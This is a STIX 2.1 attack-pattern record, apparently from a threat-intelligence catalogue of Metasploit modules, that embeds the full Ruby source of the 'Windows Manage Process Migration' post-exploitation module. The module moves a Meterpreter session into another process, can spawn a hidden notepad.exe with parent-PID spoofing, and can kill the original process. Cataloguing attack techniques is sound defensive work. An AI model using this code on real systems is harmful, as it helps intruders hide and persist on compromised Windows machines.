{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f7bc8ee8-aca5-400f-8b9e-c9b0d42c9765",
    "created": "2024-08-14T16:33:04.979161Z",
    "modified": "2024-08-14T16:33:04.979165Z",
    "name": "Windows Manage Process Migration",
    "description": " This module will migrate a Meterpreter session from one process to another. A given process PID to migrate to or the module can spawn one and migrate to that newly spawned process.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/migrate.rb",
            "external_id": "migrate.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Common\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Process Migration',\n        'Description' => %q{\n          This module will migrate a Meterpreter session from one process\n          to another. A given process PID to migrate to or the module can spawn one and\n          migrate to that newly spawned process.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Carlos Perez <carlos_perez[at]darkoperator.com>',\n          'phra <https://iwantmore.pizza>'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_migrate\n              stdapi_sys_config_getenv\n              stdapi_sys_process_attach\n              stdapi_sys_process_execute\n              stdapi_sys_process_kill\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('SPAWN', [false, 'Spawn process to migrate to. If set, notepad.exe is used.', true]),\n        OptInt.new('PID', [false, 'PID of process to migrate to.', 0]),\n        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing).', 0]),\n        OptString.new('PPID_NAME', [false, 'Name of process for PPID spoofing when creating a new process.']),\n        OptString.new('NAME', [false, 'Name of process to migrate to.']),\n        OptBool.new('KILL', [false, 'Kill original process for the session.', false])\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n\n    server = session.sys.process.open\n    original_pid = server.pid\n    print_status(\"Current server process: #{server.name} (#{server.pid})\")\n\n    target_pid = nil\n\n    if datastore['SPAWN'] && (datastore['SPAWN'] != '')\n      target_pid = create_temp_proc\n    elsif datastore['PID'] && (datastore['PID'] != 0)\n      target_pid = datastore['PID']\n    elsif datastore['NAME'] && (datastore['NAME'] != '')\n      target_pid = session.sys.process[datastore['NAME']]\n    end\n\n    if !target_pid || !has_pid?(target_pid)\n      print_error(\"Process #{target_pid} not found\")\n      return\n    end\n\n    begin\n      print_status(\"Migrating into #{target_pid}\")\n      session.core.migrate(target_pid)\n      print_good(\"Successfully migrated into process #{target_pid}\")\n    rescue ::Exception => e\n      print_error('Could not migrate into process')\n      print_error(\"Exception: #{e.class} : #{e}\")\n    end\n\n    if datastore['KILL']\n      print_status(\"Killing original process with PID #{original_pid}\")\n      if has_pid?(original_pid)\n        session.sys.process.kill(original_pid)\n        print_good(\"Successfully killed process with PID #{original_pid}\")\n      else\n        print_warning(\"PID #{original_pid} exited on its own\")\n      end\n    end\n  end\n\n  # Creates a temp notepad.exe to migrate to depending the architecture.\n  def create_temp_proc\n    target_ppid = session.sys.process[datastore['PPID_NAME']] || datastore['PPID']\n    cmd = get_notepad_pathname(client.arch, client.sys.config.getenv('windir'), client.arch)\n\n    print_status('Spawning notepad.exe process to migrate into')\n\n    if (target_ppid != 0) && !has_pid?(target_ppid)\n      print_error(\"Process #{target_ppid} not found\")\n      return\n    elsif has_pid?(target_ppid)\n      print_status(\"Spoofing PPID #{target_ppid}\")\n    end\n\n    # run hidden\n    proc = session.sys.process.execute(cmd, nil, {\n      'Hidden' => true,\n      'ParentPid' => target_ppid\n    })\n\n    return proc.pid\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}